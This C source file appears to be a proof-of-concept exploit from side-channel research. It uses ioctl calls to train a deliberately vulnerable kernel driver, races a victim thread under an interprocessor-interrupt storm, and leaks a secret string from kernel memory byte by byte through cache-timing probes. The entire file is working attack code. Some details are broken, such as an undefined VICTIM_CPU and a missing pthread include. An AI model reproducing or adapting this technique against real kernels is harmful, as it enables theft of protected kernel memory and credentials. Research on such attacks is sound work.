#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include "utils/fr.h"
#include "utils/timer.h"
#include "utils/ipi.h"
#define IOCTL_COMMAND_TRAIN         _IO('k', 1)
#define IOCTL_COMMAND_HOLD          _IO('k', 2)
#define IOCTL_COMMAND_TRANSMIT      _IO('k', 3)
#define IOCTL_COMMAND_RELEASE       _IO('k', 4)
#define IOCTL_COMMAND_REALLOC       _IO('k', 5)
#define ATTACKER_CPU 1
#define L3_CACHE_LINE_SIZE 4096*4
#define THRESHOLD 250
#define NUM_THREADS 22
char buf[L3_CACHE_LINE_SIZE*255+1];

char* DRIVER_NAME = "/dev/vuln_driver";
int fd;
pthread_t victim;

struct ioctl_data {
    uint64_t address;
    uint64_t offset;
    char* buf;
};


void do_ioctl(int ctl_code)
{
    int ret;
    ret = ioctl(fd, ctl_code);
    if (ret < 0) {
        perror("IOCTL command failed");
        close(fd);
        exit(EXIT_FAILURE);
    }
}

int do_ioctl_data(int ctl_code, struct ioctl_data* data)
{
    int ret;
    ret = ioctl(fd, ctl_code, data);
    if (ret < 0) {
        perror("IOCTL command failed");
        close(fd);
        exit(EXIT_FAILURE);
    }
    return ret;
}
void ipi_delay(unsigned long num_pid)
{
    //nanosleep(&spec, NULL);
    for (int i = 0; i < num_pid; i++)
        getpid();
}

char spectre_read(char *secret, int offset)
{
    char c = 0x0;
    for (int j = 0; j < 255; j++)
    {
        unsigned long timing;
        if ((timing = probe_timing(&buf[j * L3_CACHE_LINE_SIZE])) < THRESHOLD)
        {
            c = j;
            flush(&buf[j * L3_CACHE_LINE_SIZE]);
             //printf("Hit timing %d --> j == %c\n", timing, j);
            // printf("j: %d\n", j);
            break;
        }

            //printf("Miss timing %d\n", timing);
    }

    return c;
}

void victim_thread()
{
    pin_cpu(VICTIM_CPU);
    do_ioctl(IOCTL_COMMAND_HOLD);
}

void start_victim()
{   
    // This free would have been done in the same thread, and can be shown to collide every time
    //free(v_st);
    pthread_create(&victim, NULL, victim_thread, NULL);
}


char* actual = "This is the secret message we will leak from kernel space";
uint64_t hits = 0;
uint64_t misses = 0;

int main(int argc, char** argv) {
    
    if (argc < 3)
    {
        printf("io_driver_com [timer_length]");
        exit(0);
    }

    unsigned long timer_length = atol(argv[1]);
    unsigned long num_pid = atol(argv[2]);


    int ret;

    // Open the device file
    fd = open(DRIVER_NAME, O_RDWR);
    if (fd < 0) {
        perror("Failed to open the device file");
        return EXIT_FAILURE;
    }
    do_ioctl(IOCTL_COMMAND_REALLOC);
    pin_cpu(ATTACKER_CPU);

    printf("\n");

    for (int i = 0; i < strlen(actual); i++)
    {
        for (int j = 0; j < 500; j++)
        {
           
            ipi_register(NUM_THREADS);
            timer_init(timer_length);
            do_ioctl(IOCTL_COMMAND_TRAIN);
            // Example of sending IOCTL command 2
            
            struct ioctl_data data;
            data.buf = buf;
            data.offset = i;


            start_victim();
            ipi_delay(num_pid);
            
            begin_ipi_storm();
            char c = do_ioctl_data(IOCTL_COMMAND_TRANSMIT, &data);
            if (c == 255) // error
                exit(EXIT_FAILURE);
            if (c <= 31 || c >= 145)
            {
                misses++;
                continue;
            }
            else
            {
                if (c == actual[i])
                {
                    hits++;
                    printf("%c", c);
                    break;
                }
                else
                    misses++;
                
            }      
            timer_cleanup();
            kill_ipi();
            do_ioctl(IOCTL_COMMAND_REALLOC);
        }
        
    }
    // Example of sending IOCTL command 1
    
    printf("\n");
    // Close the device file
    close(fd);
    
    float result = (float)hits / (float)(hits + misses);

    printf("Accuracy: %.2f --> hits=%ld, misses=%ld, total=%ld\n", result, hits, misses, hits + misses);
    return EXIT_SUCCESS;
}